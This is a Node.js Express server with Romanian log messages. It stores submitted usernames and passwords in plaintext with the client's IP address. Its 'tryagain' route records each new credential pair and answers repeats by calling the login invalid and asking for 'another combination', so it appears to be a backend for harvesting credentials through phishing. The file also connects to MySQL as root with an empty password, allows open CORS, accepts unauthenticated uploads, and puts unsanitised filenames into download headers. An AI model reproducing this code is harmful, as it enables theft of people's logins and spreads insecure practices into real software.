// server.js
const express = require("express");
const mysql = require("mysql");
const cors = require("cors");
const bodyParser = require("body-parser");

const multer = require('multer');
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });


const app = express();
app.use(cors());

app.use(express.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

app.get('/', (req, res) => {
    res.send('Hello, World!');
});

app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).send('Something went wrong!');
});

const db = mysql.createConnection({
    host: 'localhost',
    user: 'root',
    password: '',
    database: 'signup'
});

db.connect((err) => {
    if (err) {
        console.error('Eroare la conectarea la MySQL:', err);
        return;
    }
    console.log('Conectat la MySQL');
});

app.post('/register', (req, res) => {
    const { username, password } = req.body;

    const checkUserSql = "SELECT * FROM users WHERE username = ? AND password = ?";
    const checkUserValues = [username, password];

    db.query(checkUserSql, checkUserValues, (checkUserErr, checkUserData) => {
        if (checkUserErr) {
            console.error('Eroare la verificarea utilizatorului în MySQL:', checkUserErr);
            return res.json({ status: 'error', message: 'Eroare la verificarea utilizatorului în MySQL' });
        }

        if (checkUserData.length > 0) {
            return res.json({ status: 'error', message: 'Utilizatorul și parola există deja.' });
        }

        const clientIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

        const insertUserSql = "INSERT INTO users (username, password, ip) VALUES (?, ?, ?)";
        const insertUserValues = [username, password, clientIp];

        db.query(insertUserSql, insertUserValues, (insertUserErr, insertUserData) => {
            if (insertUserErr) {
                console.error('Eroare la inserarea datelor în MySQL:', insertUserErr);
                return res.json({ status: 'error', message: 'Eroare la inserarea datelor în MySQL' });
            }
            
            return res.json({ status: 'success', message: 'Utilizatorul a fost înregistrat cu succes' });
        });
    });
});

app.post('/tryagain', (req, res) => {
    const { username, password } = req.body;

    const checkUserSql = "SELECT * FROM tryagain WHERE username = ? AND password = ?";
    const checkUserValues = [username, password];

    db.query(checkUserSql, checkUserValues, (checkUserErr, checkUserData) => {
        if (checkUserErr) {
            console.error('Eroare la verificarea utilizatorului în MySQL:', checkUserErr);
            return res.json({ status: 'error', message: 'Eroare la verificarea utilizatorului în MySQL' });
        }

        if (checkUserData.length > 0) {
            return res.json({ status: 'error', message: 'This combination has already been tried and is Invalid username or password. Try another combination!' });
        }

        const clientIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

        const insertUserSql = "INSERT INTO tryagain (username, password, ip) VALUES (?, ?, ?)";
        const insertUserValues = [username, password, clientIp];

        db.query(insertUserSql, insertUserValues, (insertUserErr, insertUserData) => {
            if (insertUserErr) {
                console.error('Eroare la inserarea datelor în MySQL:', insertUserErr);
                return res.json({ status: 'error', message: 'Eroare la inserarea datelor în MySQL' });
            }
            
            return res.json({ status: 'success', message: 'Utilizatorul a fost înregistrat cu succes ' });
        });
    });
});




app.post('/upload', upload.single('fileUpload'), (req, res) => {
    const file = req.file;
    if (!file) {
      return res.status(400).send('No file uploaded.');
    }
  
    const clientIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const originalFileName = req.file.originalname;
  
    const sql = 'INSERT INTO images (image, ip, original_filename) VALUES (?, ?, ?)';
    db.query(sql, [file.buffer, clientIp, originalFileName], (err, result) => {
      if (err) {
        console.error('Error inserting image into database:', err);
        return res.status(500).send('Internal Server Error');
      }
  
      res.status(200).send('File uploaded successfully!');
    });
  });
  

  app.get('/download/:id', (req, res) => {
    const imageId = req.params.id;
  
    // SQL query to retrieve image data from the database based on the image ID
    const sql = 'SELECT image, original_filename FROM images WHERE id = ?';
    
    // Execute the SQL query
    db.query(sql, [imageId], (err, result) => {
      if (err) {
        console.error('Error retrieving image from database:', err);
        return res.status(500).send('Internal Server Error');
      }
  
      // Check if the image is found
      if (result.length === 0) {
        return res.status(404).send('Image not found');
      }
  
      // Retrieve image data and original filename from the query result
      const image = result[0].image;
      const originalFilename = result[0].original_filename;
  
      // Set HTTP headers for the response
      res.setHeader('Content-Disposition', `attachment; filename=${originalFilename}`);
      res.setHeader('Content-Type', 'image/*');
  
      // Send the image data as the response
      res.send(image);
    });
  });

  app.get('/images', (req, res) => {
    // Query to retrieve the list of images from the database
    const sql = 'SELECT id, original_filename FROM images';
  
    // Execute the SQL query
    db.query(sql, (err, result) => {
      if (err) {
        console.error('Error retrieving images from database:', err);
        return res.status(500).send('Internal Server Error');
      }
  
      // Send the list of images as a JSON response
      res.json(result);
    });
  });
  
const port = 3000;
app.listen(port, () => {
    console.log(`Serverul ascultă pe portul ${port}`);
});
